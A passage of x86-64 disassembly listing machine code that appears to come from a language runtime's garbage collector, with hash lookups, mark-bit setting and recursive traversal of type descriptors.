    6d8c2fbe:	48 8b 49 18          	mov    0x18(%rcx),%rcx
    6d8c2fc2:	49 89 d0             	mov    %rdx,%r8
    6d8c2fc5:	4d 21 c8             	and    %r9,%r8
    6d8c2fc8:	4a 8b 04 c1          	mov    (%rcx,%r8,8),%rax
    6d8c2fcc:	48 85 c0             	test   %rax,%rax
    6d8c2fcf:	74 12                	je     0x6d8c2fe3
    6d8c2fd1:	48 39 50 08          	cmp    %rdx,0x8(%rax)
    6d8c2fd5:	74 0c                	je     0x6d8c2fe3
    6d8c2fd7:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
    6d8c2fdb:	49 ff c0             	inc    %r8
    6d8c2fde:	4d 21 c8             	and    %r9,%r8
    6d8c2fe1:	eb e5                	jmp    0x6d8c2fc8
    6d8c2fe3:	c3                   	ret
    6d8c2fe4:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2fe8:	49 89 d2             	mov    %rdx,%r10
    6d8c2feb:	48 c1 ea 0c          	shr    $0xc,%rdx
    6d8c2fef:	49 89 cb             	mov    %rcx,%r11
    6d8c2ff2:	e8 c3 ff ff ff       	call   0x6d8c2fba
    6d8c2ff7:	48 85 c0             	test   %rax,%rax
    6d8c2ffa:	75 0d                	jne    0x6d8c3009
    6d8c2ffc:	4c 89 d2             	mov    %r10,%rdx
    6d8c2fff:	4c 89 d9             	mov    %r11,%rcx
    6d8c3002:	e8 f9 fe ff ff       	call   0x6d8c2f00
    6d8c3007:	eb 30                	jmp    0x6d8c3039
    6d8c3009:	49 c1 ea 04          	shr    $0x4,%r10
    6d8c300d:	41 0f b6 ca          	movzbl %r10b,%ecx
    6d8c3011:	48 89 ca             	mov    %rcx,%rdx
    6d8c3014:	48 c1 ea 06          	shr    $0x6,%rdx
    6d8c3018:	4c 8d 04 d0          	lea    (%rax,%rdx,8),%r8
    6d8c301c:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c3021:	49 8b 50 10          	mov    0x10(%r8),%rdx
    6d8c3025:	48 d3 e0             	shl    %cl,%rax
    6d8c3028:	48 89 c1             	mov    %rax,%rcx
    6d8c302b:	b0 01                	mov    $0x1,%al
    6d8c302d:	48 85 ca             	test   %rcx,%rdx
    6d8c3030:	75 09                	jne    0x6d8c303b
    6d8c3032:	48 09 ca             	or     %rcx,%rdx
    6d8c3035:	49 89 50 10          	mov    %rdx,0x10(%r8)
    6d8c3039:	31 c0                	xor    %eax,%eax
    6d8c303b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c303f:	c3                   	ret
    6d8c3040:	48 85 c9             	test   %rcx,%rcx
    6d8c3043:	74 3c                	je     0x6d8c3081
    6d8c3045:	48 83 e9 10          	sub    $0x10,%rcx
    6d8c3049:	80 fa 01             	cmp    $0x1,%dl
    6d8c304c:	74 24                	je     0x6d8c3072
    6d8c304e:	84 d2                	test   %dl,%dl
    6d8c3050:	74 11                	je     0x6d8c3063
    6d8c3052:	80 fa 02             	cmp    $0x2,%dl
    6d8c3055:	74 07                	je     0x6d8c305e
    6d8c3057:	80 fa 03             	cmp    $0x3,%dl
    6d8c305a:	74 16                	je     0x6d8c3072
    6d8c305c:	eb 23                	jmp    0x6d8c3081
    6d8c305e:	e9 1c fd ff ff       	jmp    0x6d8c2d7f
    6d8c3063:	48 89 ca             	mov    %rcx,%rdx
    6d8c3066:	48 8d 0d 53 17 10 00 	lea    0x101753(%rip),%rcx        # 0x6d9c47c0
    6d8c306d:	e9 6a 02 00 00       	jmp    0x6d8c32dc
    6d8c3072:	48 89 ca             	mov    %rcx,%rdx
    6d8c3075:	48 8d 0d 8c 17 10 00 	lea    0x10178c(%rip),%rcx        # 0x6d9c4808
    6d8c307c:	e9 6c fc ff ff       	jmp    0x6d8c2ced
    6d8c3081:	c3                   	ret
    6d8c3082:	41 54                	push   %r12
    6d8c3084:	55                   	push   %rbp
    6d8c3085:	57                   	push   %rdi
    6d8c3086:	56                   	push   %rsi
    6d8c3087:	53                   	push   %rbx
    6d8c3088:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c308c:	48 85 c9             	test   %rcx,%rcx
    6d8c308f:	49 89 cc             	mov    %rcx,%r12
    6d8c3092:	48 89 d7             	mov    %rdx,%rdi
    6d8c3095:	0f 84 97 00 00 00    	je     0x6d8c3132
    6d8c309b:	f6 42 11 01          	testb  $0x1,0x11(%rdx)
    6d8c309f:	0f 85 8d 00 00 00    	jne    0x6d8c3132
    6d8c30a5:	8a 4a 10             	mov    0x10(%rdx),%cl
    6d8c30a8:	80 f9 1c             	cmp    $0x1c,%cl
    6d8c30ab:	0f 87 81 00 00 00    	ja     0x6d8c3132
    6d8c30b1:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c30b6:	48 d3 e0             	shl    %cl,%rax
    6d8c30b9:	a9 10 00 01 08       	test   $0x8010010,%eax
    6d8c30be:	75 3c                	jne    0x6d8c30fc
    6d8c30c0:	a9 00 00 40 11       	test   $0x11400000,%eax
    6d8c30c5:	75 1e                	jne    0x6d8c30e5
    6d8c30c7:	a9 00 00 06 00       	test   $0x60000,%eax
    6d8c30cc:	74 64                	je     0x6d8c3132
    6d8c30ce:	48 8b 52 20          	mov    0x20(%rdx),%rdx
    6d8c30d2:	45 0f b6 c0          	movzbl %r8b,%r8d
    6d8c30d6:	4c 89 e1             	mov    %r12,%rcx
    6d8c30d9:	48 83 c4 20          	add    $0x20,%rsp
    6d8c30dd:	5b                   	pop    %rbx
    6d8c30de:	5e                   	pop    %rsi
    6d8c30df:	5f                   	pop    %rdi
    6d8c30e0:	5d                   	pop    %rbp
    6d8c30e1:	41 5c                	pop    %r12
    6d8c30e3:	eb 58                	jmp    0x6d8c313d
    6d8c30e5:	49 8b 0c 24          	mov    (%r12),%rcx
    6d8c30e9:	41 0f b6 d0          	movzbl %r8b,%edx
    6d8c30ed:	48 83 c4 20          	add    $0x20,%rsp
    6d8c30f1:	5b                   	pop    %rbx
    6d8c30f2:	5e                   	pop    %rsi
    6d8c30f3:	5f                   	pop    %rdi
    6d8c30f4:	5d                   	pop    %rbp
    6d8c30f5:	41 5c                	pop    %r12
    6d8c30f7:	e9 44 ff ff ff       	jmp    0x6d8c3040
    6d8c30fc:	48 8b 02             	mov    (%rdx),%rax
    6d8c30ff:	41 0f b6 f0          	movzbl %r8b,%esi
    6d8c3103:	31 ed                	xor    %ebp,%ebp
    6d8c3105:	48 8b 5a 18          	mov    0x18(%rdx),%rbx
    6d8c3109:	48 99                	cqto
    6d8c310b:	48 f7 3b             	idivq  (%rbx)
    6d8c310e:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
    6d8c3112:	48 39 eb             	cmp    %rbp,%rbx
    6d8c3115:	7c 1b                	jl     0x6d8c3132
    6d8c3117:	48 8b 57 18          	mov    0x18(%rdi),%rdx
    6d8c311b:	41 89 f0             	mov    %esi,%r8d
    6d8c311e:	48 8b 0a             	mov    (%rdx),%rcx
    6d8c3121:	48 0f af cd          	imul   %rbp,%rcx
    6d8c3125:	48 ff c5             	inc    %rbp
    6d8c3128:	4c 01 e1             	add    %r12,%rcx
    6d8c312b:	e8 52 ff ff ff       	call   0x6d8c3082
    6d8c3130:	eb e0                	jmp    0x6d8c3112
    6d8c3132:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3136:	5b                   	pop    %rbx
    6d8c3137:	5e                   	pop    %rsi
    6d8c3138:	5f                   	pop    %rdi
    6d8c3139:	5d                   	pop    %rbp
    6d8c313a:	41 5c                	pop    %r12
    6d8c313c:	c3                   	ret
    6d8c313d:	41 55                	push   %r13
    6d8c313f:	41 54                	push   %r12
    6d8c3141:	55                   	push   %rbp
    6d8c3142:	57                   	push   %rdi
    6d8c3143:	56                   	push   %rsi
    6d8c3144:	53                   	push   %rbx
    6d8c3145:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3149:	8a 02                	mov    (%rdx),%al
    6d8c314b:	3c 02                	cmp    $0x2,%al
    6d8c314d:	48 89 cb             	mov    %rcx,%rbx
    6d8c3150:	48 89 d7             	mov    %rdx,%rdi
    6d8c3153:	74 30                	je     0x6d8c3185
    6d8c3155:	3c 03                	cmp    $0x3,%al
    6d8c3157:	0f 84 99 00 00 00    	je     0x6d8c31f6
    6d8c315d:	fe c8                	dec    %al
    6d8c315f:	0f 85 b6 00 00 00    	jne    0x6d8c321b
    6d8c3165:	48 03 5f 08          	add    0x8(%rdi),%rbx
    6d8c3169:	45 0f b6 c0          	movzbl %r8b,%r8d
    6d8c316d:	48 8b 52 10          	mov    0x10(%rdx),%rdx
    6d8c3171:	48 89 d9             	mov    %rbx,%rcx
    6d8c3174:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3178:	5b                   	pop    %rbx
    6d8c3179:	5e                   	pop    %rsi
    6d8c317a:	5f                   	pop    %rdi
    6d8c317b:	5d                   	pop    %rbp
    6d8c317c:	41 5c                	pop    %r12
    6d8c317e:	41 5d                	pop    %r13
    6d8c3180:	e9 fd fe ff ff       	jmp    0x6d8c3082
    6d8c3185:	48 8b 42 20          	mov    0x20(%rdx),%rax
    6d8c3189:	41 0f b6 f0          	movzbl %r8b,%esi
    6d8c318d:	31 ed                	xor    %ebp,%ebp
    6d8c318f:	41 bd 00 00 40 11    	mov    $0x11400000,%r13d
    6d8c3195:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
    6d8c3199:	49 39 ec             	cmp    %rbp,%r12
    6d8c319c:	7c 7d                	jl     0x6d8c321b
    6d8c319e:	48 8b 47 28          	mov    0x28(%rdi),%rax
    6d8c31a2:	48 8b 04 e8          	mov    (%rax,%rbp,8),%rax
    6d8c31a6:	80 38 01             	cmpb   $0x1,(%rax)
    6d8c31a9:	74 10                	je     0x6d8c31bb
    6d8c31ab:	41 89 f0             	mov    %esi,%r8d
    6d8c31ae:	48 89 c2             	mov    %rax,%rdx
    6d8c31b1:	48 89 d9             	mov    %rbx,%rcx
    6d8c31b4:	e8 84 ff ff ff       	call   0x6d8c313d
    6d8c31b9:	eb 36                	jmp    0x6d8c31f1
    6d8c31bb:	48 8b 48 08          	mov    0x8(%rax),%rcx
    6d8c31bf:	4d 89 e9             	mov    %r13,%r9
    6d8c31c2:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6d8c31c6:	48 01 d9             	add    %rbx,%rcx
    6d8c31c9:	48 89 c8             	mov    %rcx,%rax
    6d8c31cc:	8a 4a 10             	mov    0x10(%rdx),%cl
    6d8c31cf:	49 d3 e9             	shr    %cl,%r9
    6d8c31d2:	4c 89 c9             	mov    %r9,%rcx
    6d8c31d5:	80 e1 01             	and    $0x1,%cl
    6d8c31d8:	75 0d                	jne    0x6d8c31e7
    6d8c31da:	41 89 f0             	mov    %esi,%r8d
    6d8c31dd:	48 89 c1             	mov    %rax,%rcx
    6d8c31e0:	e8 9d fe ff ff       	call   0x6d8c3082
    6d8c31e5:	eb 0a                	jmp    0x6d8c31f1
    6d8c31e7:	48 8b 08             	mov    (%rax),%rcx
    6d8c31ea:	89 f2                	mov    %esi,%edx
    6d8c31ec:	e8 4f fe ff ff       	call   0x6d8c3040
    6d8c31f1:	48 ff c5             	inc    %rbp
    6d8c31f4:	eb a3                	jmp    0x6d8c3199
    6d8c31f6:	e8 83 fd ff ff       	call   0x6d8c2f7e
    6d8c31fb:	48 85 c0             	test   %rax,%rax
    6d8c31fe:	74 1b                	je     0x6d8c321b
    6d8c3200:	45 0f b6 c0          	movzbl %r8b,%r8d
    6d8c3204:	48 89 c2             	mov    %rax,%rdx
    6d8c3207:	48 89 d9             	mov    %rbx,%rcx
    6d8c320a:	48 83 c4 28          	add    $0x28,%rsp
    6d8c320e:	5b                   	pop    %rbx
    6d8c320f:	5e                   	pop    %rsi
    6d8c3210:	5f                   	pop    %rdi
    6d8c3211:	5d                   	pop    %rbp
    6d8c3212:	41 5c                	pop    %r12
    6d8c3214:	41 5d                	pop    %r13
    6d8c3216:	e9 22 ff ff ff       	jmp    0x6d8c313d
    6d8c321b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c321f:	5b                   	pop    %rbx
    6d8c3220:	5e                   	pop    %rsi
    6d8c3221:	5f                   	pop    %rdi
    6d8c3222:	5d                   	pop    %rbp
    6d8c3223:	41 5c                	pop    %r12
    6d8c3225:	41 5d                	pop    %r13
    6d8c3227:	c3                   	ret
    6d8c3228:	41 54                	push   %r12
    6d8c322a:	55                   	push   %rbp
    6d8c322b:	57                   	push   %rdi
    6d8c322c:	56                   	push   %rsi
    6d8c322d:	53                   	push   %rbx
    6d8c322e:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3232:	48 89 cb             	mov    %rcx,%rbx
    6d8c3235:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c3239:	41 89 d0             	mov    %edx,%r8d
    6d8c323c:	4c 8b 49 30          	mov    0x30(%rcx),%r9
    6d8c3240:	4d 85 c9             	test   %r9,%r9
    6d8c3243:	75 0f                	jne    0x6d8c3254
    6d8c3245:	8a 51 10             	mov    0x10(%rcx),%dl
    6d8c3248:	80 fa 16             	cmp    $0x16,%dl
    6d8c324b:	74 1b                	je     0x6d8c3268
    6d8c324d:	80 fa 18             	cmp    $0x18,%dl
    6d8c3250:	74 31                	je     0x6d8c3283
    6d8c3252:	eb 7d                	jmp    0x6d8c32d1
    6d8c3254:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
    6d8c3258:	0f b6 d2             	movzbl %dl,%edx
    6d8c325b:	48 83 c4 20          	add    $0x20,%rsp
    6d8c325f:	5b                   	pop    %rbx
    6d8c3260:	5e                   	pop    %rsi
    6d8c3261:	5f                   	pop    %rdi
    6d8c3262:	5d                   	pop    %rbp
    6d8c3263:	41 5c                	pop    %r12
    6d8c3265:	49 ff e1             	rex.WB jmp *%r9
    6d8c3268:	48 8b 51 18          	mov    0x18(%rcx),%rdx
    6d8c326c:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
    6d8c3270:	45 0f b6 c0          	movzbl %r8b,%r8d
    6d8c3274:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3278:	5b                   	pop    %rbx
    6d8c3279:	5e                   	pop    %rsi
    6d8c327a:	5f                   	pop    %rdi
    6d8c327b:	5d                   	pop    %rbp
    6d8c327c:	41 5c                	pop    %r12
    6d8c327e:	e9 ff fd ff ff       	jmp    0x6d8c3082
    6d8c3283:	48 89 dd             	mov    %rbx,%rbp
    6d8c3286:	48 83 c5 10          	add    $0x10,%rbp
    6d8c328a:	74 45                	je     0x6d8c32d1
    6d8c328c:	48 8b 7b 10          	mov    0x10(%rbx),%rdi
    6d8c3290:	31 f6                	xor    %esi,%esi
    6d8c3292:	45 0f b6 e0          	movzbl %r8b,%r12d
    6d8c3296:	48 ff cf             	dec    %rdi
    6d8c3299:	48 39 f7             	cmp    %rsi,%rdi
    6d8c329c:	7c 33                	jl     0x6d8c32d1
    6d8c329e:	48 8b 43 08          	mov    0x8(%rbx),%rax
    6d8c32a2:	b9 10 00 00 00       	mov    $0x10,%ecx
    6d8c32a7:	4c 8b 48 18          	mov    0x18(%rax),%r9
    6d8c32ab:	49 8b 51 08          	mov    0x8(%r9),%rdx
    6d8c32af:	e8 f2 fc ff ff       	call   0x6d8c2fa6
    6d8c32b4:	45 89 e0             	mov    %r12d,%r8d
    6d8c32b7:	49 8b 09             	mov    (%r9),%rcx
    6d8c32ba:	4c 89 ca             	mov    %r9,%rdx
    6d8c32bd:	48 0f af ce          	imul   %rsi,%rcx
    6d8c32c1:	48 ff c6             	inc    %rsi
    6d8c32c4:	48 01 e9             	add    %rbp,%rcx
    6d8c32c7:	48 01 c1             	add    %rax,%rcx
    6d8c32ca:	e8 b3 fd ff ff       	call   0x6d8c3082
    6d8c32cf:	eb c8                	jmp    0x6d8c3299
    6d8c32d1:	48 83 c4 20          	add    $0x20,%rsp
    6d8c32d5:	5b                   	pop    %rbx
    6d8c32d6:	5e                   	pop    %rsi
    6d8c32d7:	5f                   	pop    %rdi
    6d8c32d8:	5d                   	pop    %rbp
    6d8c32d9:	41 5c                	pop    %r12
    6d8c32db:	c3                   	ret
    6d8c32dc:	57                   	push   %rdi
    6d8c32dd:	56                   	push   %rsi
    6d8c32de:	53                   	push   %rbx
    6d8c32df:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c32e3:	48 8d b9 90 2b 00 00 	lea    0x2b90(%rcx),%rdi
    6d8c32ea:	48 89 cb             	mov    %rcx,%rbx
    6d8c32ed:	48 89 d6             	mov    %rdx,%rsi
    6d8c32f0:	48 89 f9             	mov    %rdi,%rcx
    6d8c32f3:	e8 08 fc ff ff       	call   0x6d8c2f00
    6d8c32f8:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c32fd:	48 89 f1             	mov    %rsi,%rcx
    6d8c3300:	e8 23 ff ff ff       	call   0x6d8c3228
    6d8c3305:	48 8b 43 48          	mov    0x48(%rbx),%rax
    6d8c3309:	48 85 c0             	test   %rax,%rax
    6d8c330c:	7e 20                	jle    0x6d8c332e
    6d8c330e:	48 8b 53 58          	mov    0x58(%rbx),%rdx
    6d8c3312:	48 ff c8             	dec    %rax
    6d8c3315:	48 89 f9             	mov    %rdi,%rcx
    6d8c3318:	48 89 43 48          	mov    %rax,0x48(%rbx)
    6d8c331c:	48 8b 34 c2          	mov    (%rdx,%rax,8),%rsi
    6d8c3320:	48 89 f2             	mov    %rsi,%rdx
    6d8c3323:	e8 bc fc ff ff       	call   0x6d8c2fe4
    6d8c3328:	84 c0                	test   %al,%al
    6d8c332a:	75 d9                	jne    0x6d8c3305
    6d8c332c:	eb ca                	jmp    0x6d8c32f8
    6d8c332e:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3332:	5b                   	pop    %rbx
    6d8c3333:	5e                   	pop    %rsi
    6d8c3334:	5f                   	pop    %rdi
    6d8c3335:	c3                   	ret
    6d8c3336:	48 8b 0d e3 42 10 00 	mov    0x1042e3(%rip),%rcx        # 0x6d9c7620
    6d8c333d:	31 d2                	xor    %edx,%edx
    6d8c333f:	e9 fc fc ff ff       	jmp    0x6d8c3040
    6d8c3344:	56                   	push   %rsi
    6d8c3345:	53                   	push   %rbx
    6d8c3346:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c334a:	48 89 ce             	mov    %rcx,%rsi
    6d8c334d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c3351:	0f b6 da             	movzbl %dl,%ebx
    6d8c3354:	89 da                	mov    %ebx,%edx
    6d8c3356:	e8 e5 fc ff ff       	call   0x6d8c3040
    6d8c335b:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c335f:	89 da                	mov    %ebx,%edx
    6d8c3361:	e8 da fc ff ff       	call   0x6d8c3040
    6d8c3366:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c336a:	89 da                	mov    %ebx,%edx
    6d8c336c:	e8 cf fc ff ff       	call   0x6d8c3040
    6d8c3371:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c3375:	89 da                	mov    %ebx,%edx
    6d8c3377:	48 83 c4 28          	add    $0x28,%rsp
    6d8c337b:	5b                   	pop    %rbx
    6d8c337c:	5e                   	pop    %rsi
    6d8c337d:	e9 be fc ff ff       	jmp    0x6d8c3040
    6d8c3382:	56                   	push   %rsi
    6d8c3383:	53                   	push   %rbx
    6d8c3384:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3388:	48 89 ce             	mov    %rcx,%rsi
    6d8c338b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c338f:	0f b6 da             	movzbl %dl,%ebx
    6d8c3392:	89 da                	mov    %ebx,%edx
    6d8c3394:	e8 a7 fc ff ff       	call   0x6d8c3040
    6d8c3399:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c339d:	89 da                	mov    %ebx,%edx
    6d8c339f:	e8 9c fc ff ff       	call   0x6d8c3040
    6d8c33a4:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c33a8:	89 da                	mov    %ebx,%edx
    6d8c33aa:	e8 91 fc ff ff       	call   0x6d8c3040
    6d8c33af:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c33b3:	89 da                	mov    %ebx,%edx
    6d8c33b5:	48 83 c4 28          	add    $0x28,%rsp
    6d8c33b9:	5b                   	pop    %rbx
    6d8c33ba:	5e                   	pop    %rsi
    6d8c33bb:	e9 80 fc ff ff       	jmp    0x6d8c3040
    6d8c33c0:	56                   	push   %rsi
    6d8c33c1:	53                   	push   %rbx
    6d8c33c2:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c33c6:	48 89 ce             	mov    %rcx,%rsi
    6d8c33c9:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c33cd:	0f b6 da             	movzbl %dl,%ebx
    6d8c33d0:	89 da                	mov    %ebx,%edx
    6d8c33d2:	e8 69 fc ff ff       	call   0x6d8c3040
    6d8c33d7:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c33db:	89 da                	mov    %ebx,%edx
    6d8c33dd:	e8 5e fc ff ff       	call   0x6d8c3040
    6d8c33e2:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c33e6:	89 da                	mov    %ebx,%edx
    6d8c33e8:	e8 53 fc ff ff       	call   0x6d8c3040
    6d8c33ed:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c33f1:	89 da                	mov    %ebx,%edx
    6d8c33f3:	48 83 c4 28          	add    $0x28,%rsp
    6d8c33f7:	5b                   	pop    %rbx
    6d8c33f8:	5e                   	pop    %rsi
    6d8c33f9:	e9 42 fc ff ff       	jmp    0x6d8c3040
    6d8c33fe:	56                   	push   %rsi
    6d8c33ff:	53                   	push   %rbx
    6d8c3400:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3404:	48 89 ce             	mov    %rcx,%rsi
    6d8c3407:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c340b:	0f b6 da             	movzbl %dl,%ebx
    6d8c340e:	89 da                	mov    %ebx,%edx
    6d8c3410:	e8 2b fc ff ff       	call   0x6d8c3040
    6d8c3415:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c3419:	89 da                	mov    %ebx,%edx
    6d8c341b:	e8 20 fc ff ff       	call   0x6d8c3040
    6d8c3420:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c3424:	89 da                	mov    %ebx,%edx
    6d8c3426:	e8 15 fc ff ff       	call   0x6d8c3040
    6d8c342b:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c342f:	89 da                	mov    %ebx,%edx
    6d8c3431:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3435:	5b                   	pop    %rbx
    6d8c3436:	5e                   	pop    %rsi
    6d8c3437:	e9 04 fc ff ff       	jmp    0x6d8c3040
    6d8c343c:	56                   	push   %rsi
    6d8c343d:	53                   	push   %rbx
    6d8c343e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3442:	48 89 ce             	mov    %rcx,%rsi
    6d8c3445:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c3449:	0f b6 da             	movzbl %dl,%ebx
    6d8c344c:	89 da                	mov    %ebx,%edx
    6d8c344e:	e8 ed fb ff ff       	call   0x6d8c3040
    6d8c3453:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c3457:	89 da                	mov    %ebx,%edx
    6d8c3459:	e8 e2 fb ff ff       	call   0x6d8c3040
    6d8c345e:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c3462:	89 da                	mov    %ebx,%edx
    6d8c3464:	e8 d7 fb ff ff       	call   0x6d8c3040
    6d8c3469:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c346d:	89 da                	mov    %ebx,%edx
    6d8c346f:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3473:	5b                   	pop    %rbx
    6d8c3474:	5e                   	pop    %rsi
    6d8c3475:	e9 c6 fb ff ff       	jmp    0x6d8c3040
    6d8c347a:	56                   	push   %rsi
    6d8c347b:	53                   	push   %rbx
    6d8c347c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3480:	48 89 ce             	mov    %rcx,%rsi
    6d8c3483:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c3487:	0f b6 da             	movzbl %dl,%ebx
    6d8c348a:	89 da                	mov    %ebx,%edx
    6d8c348c:	e8 af fb ff ff       	call   0x6d8c3040
    6d8c3491:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c3495:	89 da                	mov    %ebx,%edx
    6d8c3497:	e8 a4 fb ff ff       	call   0x6d8c3040
    6d8c349c:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c34a0:	89 da                	mov    %ebx,%edx
    6d8c34a2:	e8 99 fb ff ff       	call   0x6d8c3040
    6d8c34a7:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c34ab:	89 da                	mov    %ebx,%edx
    6d8c34ad:	48 83 c4 28          	add    $0x28,%rsp
    6d8c34b1:	5b                   	pop    %rbx
    6d8c34b2:	5e                   	pop    %rsi
    6d8c34b3:	e9 88 fb ff ff       	jmp    0x6d8c3040
    6d8c34b8:	56                   	push   %rsi
    6d8c34b9:	53                   	push   %rbx
    6d8c34ba:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c34be:	48 89 ce             	mov    %rcx,%rsi
    6d8c34c1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c34c5:	0f b6 da             	movzbl %dl,%ebx
    6d8c34c8:	89 da                	mov    %ebx,%edx
    6d8c34ca:	e8 71 fb ff ff       	call   0x6d8c3040
    6d8c34cf:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    6d8c34d3:	89 da                	mov    %ebx,%edx
    6d8c34d5:	e8 66 fb ff ff       	call   0x6d8c3040
    6d8c34da:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    6d8c34de:	89 da                	mov    %ebx,%edx
    6d8c34e0:	e8 5b fb ff ff       	call   0x6d8c3040
    6d8c34e5:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    6d8c34e9:	89 da                	mov    %ebx,%edx
    6d8c34eb:	48 83 c4 28          	add    $0x28,%rsp
    6d8c34ef:	5b                   	pop    %rbx
    6d8c34f0:	5e                   	pop    %rsi
    6d8c34f1:	e9 4a fb ff ff       	jmp    0x6d8c3040
    6d8c34f6:	0f b6 d2             	movzbl %dl,%edx
    6d8c34f9:	e9 42 fb ff ff       	jmp    0x6d8c3040
    6d8c34fe:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3502:	48 8b 05 d7 42 10 00 	mov    0x1042d7(%rip),%rax        # 0x6d9c77e0
    6d8c3509:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
    6d8c350f:	7e 24                	jle    0x6d8c3535
    6d8c3511:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c3516:	ff 15 14 db 00 00    	call   *0xdb14(%rip)        # 0x6d8d1030
    6d8c351c:	48 8d 15 62 ec 00 00 	lea    0xec62(%rip),%rdx        # 0x6d8d2185
    6d8c3523:	48 89 c1             	mov    %rax,%rcx
    6d8c3526:	e8 dc e6 ff ff       	call   0x6d8c1c07
    6d8c352b:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c3530:	e8 53 b0 00 00       	call   0x6d8ce588
    6d8c3535:	48 8d 15 a4 a4 0f 00 	lea    0xfa4a4(%rip),%rdx        # 0x6d9bd9e0
    6d8c353c:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
    6d8c3540:	48 ff c0             	inc    %rax
    6d8c3543:	48 89 05 96 42 10 00 	mov    %rax,0x104296(%rip)        # 0x6d9c77e0
    6d8c354a:	48 83 c4 28          	add    $0x28,%rsp
    6d8c354e:	c3                   	ret
    6d8c354f:	48 83 ec 18          	sub    $0x18,%rsp
    6d8c3553:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    6d8c3558:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
    6d8c355d:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
    6d8c3562:	31 c0                	xor    %eax,%eax
    6d8c3564:	48 85 d2             	test   %rdx,%rdx
    6d8c3567:	74 0b                	je     0x6d8c3574
    6d8c3569:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
    6d8c356e:	48 8b 01             	mov    (%rcx),%rax
    6d8c3571:	48 29 d0             	sub    %rdx,%rax
    6d8c3574:	48 83 c4 18          	add    $0x18,%rsp
    6d8c3578:	c3                   	ret
    6d8c3579:	48 8d 0d 40 12 10 00 	lea    0x101240(%rip),%rcx        # 0x6d9c47c0
    6d8c3580:	eb cd                	jmp    0x6d8c354f
    6d8c3582:	31 c0                	xor    %eax,%eax
    6d8c3584:	48 8b 11             	mov    (%rcx),%rdx
    6d8c3587:	48 39 ca             	cmp    %rcx,%rdx
    6d8c358a:	74 09                	je     0x6d8c3595
    6d8c358c:	48 8b 41 10          	mov    0x10(%rcx),%rax
    6d8c3590:	48 89 d1             	mov    %rdx,%rcx
    6d8c3593:	eb ef                	jmp    0x6d8c3584
    6d8c3595:	c3                   	ret
    6d8c3596:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    6d8c359a:	48 39 09             	cmp    %rcx,(%rcx)
    6d8c359d:	74 0a                	je     0x6d8c35a9
    6d8c359f:	48 8b 41 18          	mov    0x18(%rcx),%rax
    6d8c35a3:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c35a7:	eb f1                	jmp    0x6d8c359a
    6d8c35a9:	c3                   	ret
    6d8c35aa:	c3                   	ret
    6d8c35ab:	48 89 c8             	mov    %rcx,%rax
    6d8c35ae:	c3                   	ret
    6d8c35af:	b0 01                	mov    $0x1,%al
